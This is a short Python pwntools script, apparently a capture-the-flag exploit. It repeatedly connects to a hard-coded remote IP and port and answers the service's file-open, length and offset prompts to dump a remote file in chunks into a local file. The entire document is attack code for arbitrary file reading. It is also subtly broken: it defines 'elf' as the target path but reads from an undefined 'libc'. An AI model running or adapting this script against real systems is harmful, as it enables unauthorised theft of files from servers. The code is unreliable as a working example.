#!/usr/bin/env python
from base64 import b64encode as b64e
from pwn import *
import re

context.arch = 'amd64'
host , port = '199.247.6.180' , 10004

def readf( filename , off , len ):
    y = remote( host , port )
    y.sendlineafter( 'open:' , filename )
    y.sendlineafter( '(y/n)' , 'y' )
    y.sendlineafter( 'read:' , str( len ) )
    y.sendlineafter( 'offset:' , str( off ) )
    y.recvuntil( 'Content: ' )
    r = y.recvall()
    y.close()
    return r

elf = '/home/ctf/random_exe_name'

o = open( './elf' , 'w+' )

for i in range( 0x50000 / 0x200 ):
    t = readf( libc , i * 0x200 , 0x200 )
    o.write( t.replace( '\x0d\x0a' , '\x0a' ) )

o.close() 
